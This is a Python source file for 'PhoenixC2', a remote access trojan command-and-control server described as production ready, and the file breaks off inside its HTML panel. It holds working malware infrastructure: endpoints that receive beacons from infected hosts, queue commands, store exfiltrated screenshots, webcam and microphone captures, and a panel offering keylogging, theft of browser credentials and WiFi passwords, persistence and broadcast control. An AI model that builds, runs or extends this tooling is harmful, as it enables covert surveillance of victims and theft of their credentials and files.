#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
PhoenixC2 - Production Ready Command & Control Server
Author: Pliny
Features: Multi-session management, real-time command execution, data exfiltration
"""

import os
import sys
import json
import time
import socket
import base64
import hashlib
import logging
import threading
import sqlite3
import datetime
import argparse
import uuid
import re
import queue
from flask import Flask, request, jsonify, render_template, send_file
from flask_socketio import SocketIO, emit
from flask_cors import CORS
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC  # FIXED IMPORT

app = Flask(__name__)
CORS(app)
socketio = SocketIO(app, cors_allowed_origins="*")

# Configuration
DATABASE = "phoenix_c2.db"
ENCRYPTION_KEY = None
SESSIONS = {}
COMMAND_QUEUE = {}
OUTPUT_QUEUE = queue.Queue()
LOGGER = None

def setup_logger():
    """Setup logging configuration"""
    global LOGGER
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
        handlers=[
            logging.FileHandler('phoenix_c2.log'),
            logging.StreamHandler()
        ]
    )
    LOGGER = logging.getLogger('PhoenixC2')
    setup_logger()
def init_database():
    """Initialize SQLite database"""
    conn = sqlite3.connect(DATABASE)
    cursor = conn.cursor()
    
    # Sessions table
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS sessions (
            id TEXT PRIMARY KEY,
            session_id TEXT UNIQUE,
            hostname TEXT,
            username TEXT,
            platform TEXT,
            system TEXT,
            ip_address TEXT,
            public_ip TEXT,
            mac_address TEXT,
            first_seen TIMESTAMP,
            last_seen TIMESTAMP,
            status TEXT,
            notes TEXT
        )
    ''')
    
    # Commands table
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS commands (
            id TEXT PRIMARY KEY,
            session_id TEXT,
            command TEXT,
            status TEXT,
            issued_time TIMESTAMP,
            executed_time TIMESTAMP,
            output TEXT,
            FOREIGN KEY (session_id) REFERENCES sessions (session_id)
        )
    ''')
    
    # Exfiltrated data table
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS exfiltrated_data (
            id TEXT PRIMARY KEY,
            session_id TEXT,
            data_type TEXT,
            data TEXT,
            timestamp TIMESTAMP,
            FOREIGN KEY (session_id) REFERENCES sessions (session_id)
        )
    ''')
    
    # System info table
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS system_info (
            id TEXT PRIMARY KEY,
            session_id TEXT,
            cpu_count INTEGER,
            memory_total INTEGER,
            disk_usage TEXT,
            processes INTEGER,
            boot_time INTEGER,
            timezone TEXT,
            timestamp TIMESTAMP,
            FOREIGN KEY (session_id) REFERENCES sessions (session_id)
        )
    ''')
    
    conn.commit()
    conn.close()
    LOGGER.info("Database initialized")

def generate_key():
    """Generate or load encryption key"""
    global ENCRYPTION_KEY
    key_file = "c2_key.key"
    
    if os.path.exists(key_file):
        with open(key_file, "rb") as f:
            ENCRYPTION_KEY = f.read()
    else:
        password = b"phoenix_c2_master_key_2026"
        salt = os.urandom(16)
        kdf = PBKDF2HMAC(                          # FIXED CLASS NAME
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=100000
        )
        ENCRYPTION_KEY = base64.urlsafe_b64encode(kdf.derive(password))
        
        with open(key_file, "wb") as f:
            f.write(ENCRYPTION_KEY)
    
    LOGGER.info("Encryption key loaded")

class SessionManager:
    """Manage active RAT sessions"""
    
    @staticmethod
    def register_session(session_data):
        """Register a new session or update existing"""
        try:
            session_id = session_data.get("session_id")
            decrypted = decrypt_data(session_data.get("data"))
            info = json.loads(decrypted)
            
            conn = sqlite3.connect(DATABASE)
            cursor = conn.cursor()
            
            # Check if session exists
            cursor.execute("SELECT * FROM sessions WHERE session_id = ?", (session_id,))
            existing = cursor.fetchone()
            
            now = datetime.datetime.now()
            
            if existing:
                # Update existing session
                cursor.execute('''
                    UPDATE sessions SET 
                        last_seen = ?,
                        status = ?,
                        ip_address = ?,
                        public_ip = ?
                    WHERE session_id = ?
                ''', (now, "active", info.get("ip_addresses", [""])[0], 
                      info.get("public_ip", ""), session_id))
            else:
                # Insert new session
                cursor.execute('''
                    INSERT INTO sessions 
                    (id, session_id, hostname, username, platform, system, 
                     ip_address, public_ip, mac_address, first_seen, last_seen, status)
                    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                ''', (
                    str(uuid.uuid4()),
                    session_id,
                    info.get("hostname", "Unknown"),
                    info.get("username", "Unknown"),
                    info.get("platform", "Unknown"),
                    info.get("system", "Unknown"),
                    info.get("ip_addresses", [""])[0],
                    info.get("public_ip", "Unknown"),
                    info.get("mac_address", "Unknown"),
                    now,
                    now,
                    "active"
                ))
                
                # Store system info
                cursor.execute('''
                    INSERT INTO system_info
                    (id, session_id, cpu_count, memory_total, disk_usage, 
                     processes, boot_time, timezone, timestamp)
                    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
                ''', (
                    str(uuid.uuid4()),
                    session_id,
                    info.get("cpu_count", 0),
                    info.get("memory_total", 0),
                    json.dumps(info.get("disk_usage", {})),
                    info.get("processes", 0),
                    info.get("boot_time", 0),
                    json.dumps(info.get("timezone", [])),
                    now
                ))
            
            conn.commit()
            conn.close()
            
            # Update in-memory sessions
            SESSIONS[session_id] = {
                "info": info,
                "last_seen": now,
                "status": "active",
                "commands": []
            }
            
            # Emit socketio event for new session
            socketio.emit('session_update', {
                'session_id': session_id,
                'hostname': info.get("hostname"),
                'username': info.get("username"),
                'ip': info.get("public_ip"),
                'status': 'active',
                'last_seen': now.isoformat()
            })
            
            LOGGER.info(f"Session registered: {session_id} from {info.get('public_ip')}")
            
            return {"status": "success", "session_id": session_id}
            
        except Exception as e:
            LOGGER.error(f"Session registration error: {e}")
            return {"status": "error", "message": str(e)}
    
    @staticmethod
    def update_session_status(session_id, status):
        """Update session status"""
        try:
            conn = sqlite3.connect(DATABASE)
            cursor = conn.cursor()
            
            cursor.execute('''
                UPDATE sessions SET status = ?, last_seen = ? 
                WHERE session_id = ?
            ''', (status, datetime.datetime.now(), session_id))
            
            conn.commit()
            conn.close()
            
            if session_id in SESSIONS:
                SESSIONS[session_id]["status"] = status
                SESSIONS[session_id]["last_seen"] = datetime.datetime.now()
            
            socketio.emit('session_update', {
                'session_id': session_id,
                'status': status,
                'last_seen': datetime.datetime.now().isoformat()
            })
            
        except Exception as e:
            LOGGER.error(f"Status update error: {e}")
    
    @staticmethod
    def get_active_sessions():
        """Get list of active sessions"""
        sessions = []
        for sid, data in SESSIONS.items():
            sessions.append({
                "session_id": sid,
                "hostname": data["info"].get("hostname"),
                "username": data["info"].get("username"),
                "ip": data["info"].get("public_ip"),
                "platform": data["info"].get("platform"),
                "status": data["status"],
                "last_seen": data["last_seen"].isoformat() if data["last_seen"] else None
            })
        return sessions

def decrypt_data(encrypted_b64):
    """Decrypt data from RAT"""
    try:
        encrypted = base64.b64decode(encrypted_b64)
        fernet = Fernet(ENCRYPTION_KEY)
        return fernet.decrypt(encrypted)
    except Exception as e:
        LOGGER.error(f"Decryption error: {e}")
        return None

def encrypt_data(data):
    """Encrypt data for RAT"""
    try:
        fernet = Fernet(ENCRYPTION_KEY)
        encrypted = fernet.encrypt(data if isinstance(data, bytes) else data.encode())
        return base64.b64encode(encrypted).decode()
    except Exception as e:
        LOGGER.error(f"Encryption error: {e}")
        return None

@app.route('/api/beacon', methods=['POST'])
def beacon():
    """Handle RAT beacon"""
    try:
        data = request.get_json()
        session_id = data.get("session_id")
        
        # Register/update session
        session_data = data.get("data")
        if session_data:
            result = SessionManager.register_session(data)
            if result["status"] != "success":
                return jsonify({"status": "error"}), 500
        
        # Get pending commands for session
        commands = []
        if session_id in COMMAND_QUEUE:
            commands = COMMAND_QUEUE.get(session_id, [])
            COMMAND_QUEUE[session_id] = []
        
        # Update last seen
        if session_id in SESSIONS:
            SESSIONS[session_id]["last_seen"] = datetime.datetime.now()
        
        LOGGER.debug(f"Beacon from {session_id}, {len(commands)} commands pending")
        
        return jsonify({
            "status": "success",
            "commands": commands
        })
        
    except Exception as e:
        LOGGER.error(f"Beacon error: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/api/output', methods=['POST'])
def receive_output():
    """Receive command output from RAT"""
    try:
        data = request.get_json()
        session_id = data.get("session_id")
        encrypted_output = data.get("data")
        
        decrypted = decrypt_data(encrypted_output)
        output = json.loads(decrypted)
        
        # Store in database
        conn = sqlite3.connect(DATABASE)
        cursor = conn.cursor()
        
        cursor.execute('''
            UPDATE commands 
            SET status = ?, executed_time = ?, output = ?
            WHERE id = ?
        ''', ('executed', datetime.datetime.now(), json.dumps(output), output.get("command_id")))
        
        # Store exfiltrated data if applicable
        if output.get("type") in ["screenshot", "webcam", "microphone", "download"]:
            cursor.execute('''
                INSERT INTO exfiltrated_data
                (id, session_id, data_type, data, timestamp)
                VALUES (?, ?, ?, ?, ?)
            ''', (
                str(uuid.uuid4()),
                session_id,
                output.get("type"),
                output.get("output", ""),
                datetime.datetime.now()
            ))
        
        conn.commit()
        conn.close()
        
        # Add to output queue for web interface
        OUTPUT_QUEUE.put({
            "session_id": session_id,
            "output": output,
            "timestamp": datetime.datetime.now().isoformat()
        })
        
        # Emit via websocket
        socketio.emit('command_output', {
            'session_id': session_id,
            'output': output,
            'timestamp': datetime.datetime.now().isoformat()
        })
        
        LOGGER.info(f"Output received from {session_id} for command {output.get('command_id')}")
        
        return jsonify({"status": "success"})
        
    except Exception as e:
        LOGGER.error(f"Output receive error: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/api/command', methods=['POST'])
def issue_command():
    """Issue command to RAT"""
    try:
        data = request.get_json()
        session_id = data.get("session_id")
        command_type = data.get("type")
        command_data = data.get("data", {})
        
        if not session_id or not command_type:
            return jsonify({"status": "error", "message": "Missing parameters"}), 400
        
        # Generate command ID
        command_id = str(uuid.uuid4())
        
        # Create command object
        command = {
            "id": command_id,
            "type": command_type,
            "data": command_data,
            "timestamp": time.time()
        }
        
        # Add to queue for session
        if session_id not in COMMAND_QUEUE:
            COMMAND_QUEUE[session_id] = []
        COMMAND_QUEUE[session_id].append(command)
        
        # Store in database
        conn = sqlite3.connect(DATABASE)
        cursor = conn.cursor()
        
        cursor.execute('''
            INSERT INTO commands
            (id, session_id, command, status, issued_time)
            VALUES (?, ?, ?, ?, ?)
        ''', (
            command_id,
            session_id,
            json.dumps({"type": command_type, "data": command_data}),
            'issued',
            datetime.datetime.now()
        ))
        
        conn.commit()
        conn.close()
        
        # Add to session commands
        if session_id in SESSIONS:
            SESSIONS[session_id]["commands"].append(command)
        
        LOGGER.info(f"Command {command_id} ({command_type}) issued to {session_id}")
        
        return jsonify({
            "status": "success",
            "command_id": command_id
        })
        
    except Exception as e:
        LOGGER.error(f"Command issue error: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/api/sessions', methods=['GET'])
def list_sessions():
    """List all active sessions"""
    sessions = SessionManager.get_active_sessions()
    return jsonify({
        "status": "success",
        "sessions": sessions
    })

@app.route('/api/session/<session_id>', methods=['GET'])
def get_session(session_id):
    """Get detailed session information"""
    try:
        conn = sqlite3.connect(DATABASE)
        cursor = conn.cursor()
        
        # Get session info
        cursor.execute("SELECT * FROM sessions WHERE session_id = ?", (session_id,))
        session = cursor.fetchone()
        
        if not session:
            return jsonify({"status": "error", "message": "Session not found"}), 404
        
        # Get system info
        cursor.execute("SELECT * FROM system_info WHERE session_id = ? ORDER BY timestamp DESC LIMIT 1", (session_id,))
        sysinfo = cursor.fetchone()
        
        # Get recent commands
        cursor.execute("SELECT * FROM commands WHERE session_id = ? ORDER BY issued_time DESC LIMIT 50", (session_id,))
        commands = cursor.fetchall()
        
        # Get exfiltrated data
        cursor.execute("SELECT * FROM exfiltrated_data WHERE session_id = ? ORDER BY timestamp DESC LIMIT 100", (session_id,))
        exfil = cursor.fetchall()
        
        conn.close()
        
        # Format response
        response = {
            "session_id": session_id,
            "session_info": {
                "id": session[0],
                "hostname": session[2],
                "username": session[3],
                "platform": session[4],
                "system": session[5],
                "ip": session[6],
                "public_ip": session[7],
                "mac": session[8],
                "first_seen": session[9],
                "last_seen": session[10],
                "status": session[11],
                "notes": session[12]
            },
            "system_info": {
                "cpu_count": sysinfo[2] if sysinfo else None,
                "memory_total": sysinfo[3] if sysinfo else None,
                "disk_usage": json.loads(sysinfo[4]) if sysinfo and sysinfo[4] else {},
                "processes": sysinfo[5] if sysinfo else None,
                "boot_time": sysinfo[6] if sysinfo else None,
                "timezone": json.loads(sysinfo[7]) if sysinfo and sysinfo[7] else [],
                "timestamp": sysinfo[8] if sysinfo else None
            } if sysinfo else {},
            "recent_commands": [
                {
                    "id": cmd[0],
                    "command": json.loads(cmd[2]),
                    "status": cmd[3],
                    "issued": cmd[4],
                    "executed": cmd[5],
                    "output": json.loads(cmd[6]) if cmd[6] else None
                } for cmd in commands
            ],
            "exfiltrated_data": [
                {
                    "id": ex[0],
                    "type": ex[2],
                    "data": ex[3][:100] + "..." if len(ex[3]) > 100 else ex[3],  # Truncate for preview
                    "timestamp": ex[4]
                } for ex in exfil
            ]
        }
        
        return jsonify({"status": "success", "data": response})
        
    except Exception as e:
        LOGGER.error(f"Get session error: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/api/exfiltrated/<data_id>', methods=['GET'])
def get_exfiltrated_data(data_id):
    """Get full exfiltrated data by ID"""
    try:
        conn = sqlite3.connect(DATABASE)
        cursor = conn.cursor()
        
        cursor.execute("SELECT * FROM exfiltrated_data WHERE id = ?", (data_id,))
        data = cursor.fetchone()
        
        conn.close()
        
        if not data:
            return jsonify({"status": "error", "message": "Data not found"}), 404
        
        # If it's a file type, return as downloadable
        if data[2] in ["screenshot", "webcam", "microphone", "download"]:
            # Decode base64 data
            file_data = base64.b64decode(data[3])
            
            # Determine filename
            ext = {
                "screenshot": "png",
                "webcam": "jpg",
                "microphone": "wav",
                "download": "bin"
            }.get(data[2], "bin")
            
            filename = f"{data[2]}_{data[4].replace(':', '-')}.{ext}"
            
            # Save temporarily
            temp_path = f"/tmp/{filename}"
            with open(temp_path, "wb") as f:
                f.write(file_data)
            
            return send_file(temp_path, as_attachment=True, download_name=filename)
        
        return jsonify({
            "status": "success",
            "data": {
                "id": data[0],
                "session_id": data[1],
                "type": data[2],
                "data": data[3],
                "timestamp": data[4]
            }
        })
        
    except Exception as e:
        LOGGER.error(f"Get exfiltrated data error: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/api/kill/<session_id>', methods=['POST'])
def kill_session(session_id):
    """Kill a session (send self-destruct)"""
    try:
        # Issue self-destruct command
        command_id = str(uuid.uuid4())
        command = {
            "id": command_id,
            "type": "self_destruct",
            "data": {},
            "timestamp": time.time()
        }
        
        if session_id not in COMMAND_QUEUE:
            COMMAND_QUEUE[session_id] = []
        COMMAND_QUEUE[session_id].append(command)
        
        # Update session status
        SessionManager.update_session_status(session_id, "killed")
        
        LOGGER.warning(f"Kill command issued to {session_id}")
        
        return jsonify({"status": "success", "message": "Kill command issued"})
        
    except Exception as e:
        LOGGER.error(f"Kill session error: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/api/broadcast', methods=['POST'])
def broadcast_command():
    """Broadcast command to all active sessions"""
    try:
        data = request.get_json()
        command_type = data.get("type")
        command_data = data.get("data", {})
        
        if not command_type:
            return jsonify({"status": "error", "message": "Missing command type"}), 400
        
        sessions = SessionManager.get_active_sessions()
        issued_count = 0
        
        for session in sessions:
            if session["status"] == "active":
                command_id = str(uuid.uuid4())
                command = {
                    "id": command_id,
                    "type": command_type,
                    "data": command_data,
                    "timestamp": time.time()
                }
                
                sid = session["session_id"]
                if sid not in COMMAND_QUEUE:
                    COMMAND_QUEUE[sid] = []
                COMMAND_QUEUE[sid].append(command)
                issued_count += 1
        
        LOGGER.info(f"Broadcast {command_type} to {issued_count} sessions")
        
        return jsonify({
            "status": "success",
            "message": f"Command broadcast to {issued_count} sessions"
        })
        
    except Exception as e:
        LOGGER.error(f"Broadcast error: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/api/stats', methods=['GET'])
def get_stats():
    """Get C2 server statistics"""
    try:
        conn = sqlite3.connect(DATABASE)
        cursor = conn.cursor()
        
        # Total sessions
        cursor.execute("SELECT COUNT(*) FROM sessions")
        total_sessions = cursor.fetchone()[0]
        
        # Active sessions
        cursor.execute("SELECT COUNT(*) FROM sessions WHERE status = 'active'")
        active_sessions = cursor.fetchone()[0]
        
        # Total commands
        cursor.execute("SELECT COUNT(*) FROM commands")
        total_commands = cursor.fetchone()[0]
        
        # Total exfiltrated data
        cursor.execute("SELECT COUNT(*) FROM exfiltrated_data")
        total_exfil = cursor.fetchone()[0]
        
        # Commands by type
        cursor.execute("SELECT command, COUNT(*) FROM commands GROUP BY command")
        commands_by_type = {}
        for row in cursor.fetchall():
            try:
                cmd_data = json.loads(row[0])
                cmd_type = cmd_data.get("type", "unknown")
                commands_by_type[cmd_type] = row[1]
            except:
                pass
        
        conn.close()
        
        return jsonify({
            "status": "success",
            "stats": {
                "total_sessions": total_sessions,
                "active_sessions": active_sessions,
                "total_commands": total_commands,
                "total_exfiltrated": total_exfil,
                "commands_by_type": commands_by_type,
                "server_time": datetime.datetime.now().isoformat(),
                "uptime": time.time() - start_time
            }
        })
        
    except Exception as e:
        LOGGER.error(f"Stats error: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/')
def index():
    """Web interface"""
    return render_template('index.html')

@app.route('/api/output/stream')
def stream_output():
    """Server-sent events for output streaming"""
    def generate():
        while True:
            try:
                output = OUTPUT_QUEUE.get(timeout=30)
                yield f"data: {json.dumps(output)}\n\n"
            except queue.Empty:
                yield "data: {}\n\n"
    
    return app.response_class(generate(), mimetype="text/event-stream")

def create_web_interface():
    """Create HTML template for web interface"""
    template_dir = os.path.join(os.path.dirname(__file__), 'templates')
    os.makedirs(template_dir, exist_ok=True)
    
    index_html = '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PhoenixC2 - Command & Control</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/socket.io-client@4.4.1/dist/socket.io.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/chart.js@3.7.0/dist/chart.min.js"></script>
    <style>
        body { 
            background: #0a0e1a; 
            color: #00ff9d;
            font-family: 'Courier New', monospace;
            overflow-x: hidden;
        }
        .terminal { 
            background: #1a1e2a; 
            border: 2px solid #00ff9d;
            border-radius: 10px;
            padding: 20px;
            margin: 20px 0;
            box-shadow: 0 0 20px rgba(0,255,157,0.3);
        }
        .terminal-header {
            border-bottom: 1px solid #00ff9d;
            padding-bottom: 10px;
            margin-bottom: 20px;
            color: #00ff9d;
            text-transform: uppercase;
            letter-spacing: 2px;
        }
        .session-card {
            background: #1a1e2a;
            border: 1px solid #00ff9d;
            border-radius: 5px;
            padding: 15px;
            margin: 10px 0;
            transition: all 0.3s;
            cursor: pointer;
        }
        .session-card:hover {
            transform: translateY(-5px);
            box-shadow: 0 5px 20px rgba(0,255,157,0.5);
        }
        .status-active {
            color: #00ff9d;
            font-weight: bold;
        }
        .status-idle {
            color: #ffaa00;
        }
        .status-dead {
            color: #ff4444;
        }
        .command-input {
            background: #0a0e1a;
            border: 1px solid #00ff9d;
            color: #00ff9d;
            font-family: 'Courier New', monospace;
            width: 100%;
            padding: 10px;
            margin: 10px 0;
        }
        .command-output {
            background: #0a0e1a;
            border: 1px solid #444;
            color: #00ff9d;
            padding: 10px;
            height: 400px;
            overflow-y: auto;
            font-family: 'Courier New', monospace;
            white-space: pre-wrap;
        }
        .blink {
            animation: blink 1s infinite;
        }
        @keyframes blink {
            0% { opacity: 1; }
            50% { opacity: 0; }
            100% { opacity: 1; }
        }
        .matrix-bg {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            opacity: 0.05;
            z-index: -1;
        }
        .nav-tabs .nav-link {
            color: #00ff9d;
            border: 1px solid #00ff9d;
            margin: 0 5px;
        }
        .nav-tabs .nav-link.active {
            background: #00ff9d;
            color: #0a0e1a;
            border-color: #00ff9d;
        }
        .data-table {
            color: #00ff9d;
        }
        .data-table th {
            border-bottom: 2px solid #00ff9d;
        }
        .btn-phoenix {
            background: transparent;
            border: 1px solid #00ff9d;
            color: #00ff9d;
            margin: 2px;
        }
        .btn-phoenix:hover {
            background: #00ff9d;
            color: #0a0e1a;
        }
    </style>
</head>
<body>
    <div class="matrix-bg" id="matrix"></div>
    
    <div class="container-fluid">
        <!-- Header -->
        <div class="row">
            <div class="col-12">
                <div class="terminal">
                    <div class="terminal-header">
                        <h1><i class="fa fa-bolt"></i> PHOENIX C2 v2.0 <span class="blink">_</span></h1>
                        <div id="stats-header" class="row">
                            <div class="col-md-3">Active Sessions: <span id="active-count">0</span></div>
                            <div class="col-md-3">Total Sessions: <span id="total-count">0</span></div>
                            <div class="col-md-3">Commands Issued: <span id="cmd-count">0</span></div>
                            <div class="col-md-3">Server Time: <span id="server-time"></span></div>
                        </div>
                    </div>
                    
                    <!-- Navigation Tabs -->
                    <ul class="nav nav-tabs" id="myTab" role="tablist">
                        <li class="nav-item" role="presentation">
                            <button class="nav-link active" id="sessions-tab" data-bs-toggle="tab" data-bs-target="#sessions" type="button">SESSIONS</button>
                        </li>
                        <li class="nav-item" role="presentation">
                            <button class="nav-link" id="console-tab" data-bs-toggle="tab" data-bs-target="#console" type="button">CONSOLE</button>
                        </li>
                        <li class="nav-item" role="presentation">
                            <button class="nav-link" id="files-tab" data-bs-toggle="tab" data-bs-target="#files" type="button">EXFILTRATED</button>
                        </li>
                        <li class="nav-item" role="presentation">
                            <button class="nav-link" id="stats-tab" data-bs-toggle="tab" data-bs-target="#stats" type="button">STATISTICS</button>
                        </li>
                        <li class="nav-item" role="presentation">
                            <button class="nav-link" id="broadcast-tab" data-bs-toggle="tab" data-bs-target="#broadcast" type="button">BROADCAST</button>
                        </li>
                    </ul>
                </div>
            </div>
        </div>
        
        <!-- Tab Content -->
        <div class="tab-content" id="myTabContent">
            <!-- Sessions Tab -->
            <div class="tab-pane fade show active" id="sessions" role="tabpanel">
                <div class="row">
                    <div class="col-md-4">
                        <div class="terminal">
                            <h5><i class="fa fa-server"></i> ACTIVE SESSIONS</h5>
                            <div id="session-list" class="session-list">
                                <!-- Sessions will be loaded here -->
                            </div>
                        </div>
                    </div>
                    <div class="col-md-8">
                        <div class="terminal">
                            <h5><i class="fa fa-info-circle"></i> SESSION DETAILS</h5>
                            <div id="session-details">
                                <p class="text-muted">Select a session to view details</p>
                            </div>
                            
                            <!-- Command Interface -->
                            <div id="command-interface" style="display: none;">
                                <h6 class="mt-3">Command Interface - Session: <span id="current-session"></span></h6>
                                
                                <div class="row">
                                    <div class="col-md-8">
                                        <select id="command-type" class="form-select command-input">
                                            <option value="shell">Shell Command</option>
                                            <option value="screenshot">Take Screenshot</option>
                                            <option value="webcam">Capture Webcam</option>
                                            <option value="microphone">Record Microphone</option>
                                            <option value="keylog_start">Start Keylogger</option>
                                            <option value="keylog_stop">Stop Keylogger</option>
                                            <option value="keylog_get">Get Keylogs</option>
                                            <option value="process_list">List Processes</option>
                                            <option value="process_kill">Kill Process</option>
                                            <option value="browser_creds">Steal Browser Creds</option>
                                            <option value="wifi_profiles">Get WiFi Passwords</option>
                                            <option value="clipboard">Get Clipboard</option>
                                            <option value="lock">Lock Workstation</option>
                                            <option value="message">Show Message</option>
                                            <option value="download">Download File</option>
                                            <option value="upload">Upload File</option>
                                            <option value="persistence">Reinstall Persistence</option>
                                            <option value="self_destruct">SELF DESTRUCT</option>
                                        </select>
                                    </div>
                                    <div class="col-md-4">
                                        <button class="btn btn-phoenix w-100" onclick="executeCommand()">
                                            <i class="fa fa-play"></i> EXECUTE
                                        </button>
                                    </div>
                                </div>
                                
                                <div id="command-params" class="mt-2">
                                    <input type="text" id="command-param" class="command-input" placeholder="Command parameters...">
                                </div>
                                
                                <div class="mt-3">
                                    <h6>Command Output:</h6>
                                    <div id="command-output" class="command-output">
                                        Ready for commands...
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            
            <!-- Console Tab -->
            <div class="tab-pane fade" id="console" role="tabpanel">
                <div class="terminal">
                    <h5><i class="fa fa-terminal"></i> GLOBAL CONSOLE</h5>
                    <div id="global-output" class="command-output" style="height: 600px;">
                        <!-- Global output will appear here -->
                    </div>
                </div>
            </div>
            
            <!-- Files Tab -->
            <div class="tab-pane fade" id="files" role="tabpanel">
                <div class="terminal">
                    <h5><i class="fa fa-file"></i> EXFILTRATED DATA</h5>
                    <table class="table data-table">
                        <thead>
                            <tr>
                                <th>Timestamp</th>
                                <th>Session</th>
                                <th>Type</th>
                                <th>Preview</th>
                                <th>Action</th>
                            </tr>
                        </thead>
                        <tbody id="exfiltrated-data">
                            <!-- Exfiltrated data will be loaded here -->
                        </tbody>
                    </table>
                </div>
            </div>
            
            <!-- Stats Tab -->
            <div class="tab-pane fade" id="stats" role="tabpanel">
                <div class="row">
                    <div class="col-md-6">
                        <div class="terminal">
                            <h5><i class="fa fa-pie-chart"></i> SESSION STATISTICS</h5>
                            <canvas id="sessionChart"></canvas>
                        </div>
                    </div>
                    <div class="col-md-6">
                        <div class="terminal">
                            <h5><i class="fa fa-bar-chart"></i> COMMAND STATISTICS</h5>
                            <canvas id="commandChart"></canvas>
                        </div>
                    </div>
                </div>
            </div>
            
            <!-- Broadcast Tab -->
            <div class="tab-pane fade" id="broadcast" role="tabpanel">
                <div class="terminal">
                    <h5><i class="fa fa-bullhorn"></i> BROADCAST COMMAND</h5>
                    <p>Send a command to ALL active sessions simultaneously</p>
                    
                    <select id="broadcast-type" class="form-select command-input">
                        <option value="shell">Shell Command</option>
                        <option value="message">Show Message</option>
                        <option value="lock">Lock All Workstations</option>
                        <option value="screenshot">Take Screenshots</option>
                        <option value="process_list">List All Processes</option>
                        <option value="self_destruct">SELF DESTRUCT ALL</option>
                    </select>
                    
                    <input type="text" id="broadcast-param" class="command-input" placeholder="Command parameters...">
                    
                    <button class="btn btn-phoenix w-100 mt-2" onclick="broadcastCommand()">
                        <i class="fa fa-bullhorn"></i> BROADCAST
                    </button>
                </div>
            </div>
        </div>
    </div>
    
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>
    <script>
        const socket = io();
        let currentSession = null;
        let sessions = {};
        
        // Matrix rain effect
        function createMatrix() {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            document.getElementById('matrix').appendChild(canvas);
            
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
            
            const chars = "01アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン";
            const fontSize = 14;
            const columns = canvas.width / fontSize;
            
            const drops = [];
            for(let x = 0; x < columns; x++) {
                drops[x] = 1;
            }
            
            function draw() {
                ctx.fillStyle = 'rgba(10, 14, 26, 0.05)';
                ctx.fillRect(0, 0, canvas.width, canvas.height);
                
                ctx.fillStyle = '#00ff9d';
                ctx.font = fontSize + 'px monospace';
                
                for(let i = 0; i < drops.length; i++) {
                    const text = chars.charAt(Math.floor(Math.random() * chars.length));
                    ctx.fillText(text, i * fontSize, drops[i] * fontSize);
                    
                    if(drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
                        drops[i] = 0;
                    }
                    drops[i]++;
                }
            }
            
            setInterval(draw, 50);
        }
        
        // Load sessions
        function loadSessions() {
            fetch('/api/sessions')
                .then(response => response.json())
                .then(data => {
                    const sessionList = document.getElementById('session-list');
                    sessionList.innerHTML = '';
                    
                    sessions = {};
                    data.sessions.forEach(session => {
                        sessions[session.session_id] = session;
                        
                        const card = document.createElement('div');
                        card.className = 'session-card';
                        card.onclick = () => selectSession(session.session_id);
                        
                        let statusClass = 'status-active';
                        if (session.status === 'idle') statusClass = 'status-idle';
                        if (session.status === 'dead') statusClass = 'status-dead';
                        
                        card.innerHTML = `
                            <div class="d-flex justify-content-between">
                                <strong>${session.hostname}</strong>
                                <span class="${statusClass}">${session.status}</span>
                            </div>
                            <div class="small">${session.username} @ ${session.ip}</div>
                            <div class="small">${session.platform}</div>
                            <div class="small">Last: ${new Date(session.last_seen).toLocaleTimeString()}</div>
                        `;
                        
                        sessionList.appendChild(card);
                    });
                    
                    document.getElementById('active-count').innerText = 
                        data.sessions.filter(s => s.status === 'active').length;
                });
        }
        
        // Select session
        function selectSession(sessionId) {
            currentSession = sessionId;
            document.getElementById('current-session').innerText = sessionId;
            document.getElementById('command-interface').style.display = 'block';
            
            fetch(`/api/session/${sessionId}`)
                .then(response => response.json())
                .then(data => {
                    if (data.status === 'success') {
                        displaySessionDetails(data.data);
                    }
                });
        }
        
        // Display session details
        function displaySessionDetails(data) {
            const details = document.getElementById('session-details');
            
            let html = `
                <div class="row">
                    <div class="col-md-6">
                        <strong>Hostname:</strong> ${data.session_info.hostname}<br>
                        <strong>Username:</strong> ${data.session_info.username}<br>
                        <strong>Platform:</strong> ${data.session_info.platform}<br>
                        <strong>IP Address:</strong> ${data.session_info.ip}<br>
                        <strong>Public IP:</strong> ${data.session_info.public_ip}<br>
                    </div>
                    <div class="col-md-6">
                        <strong>First Seen:</strong> ${new Date(data.session_info.first_seen).toLocaleString()}<br>
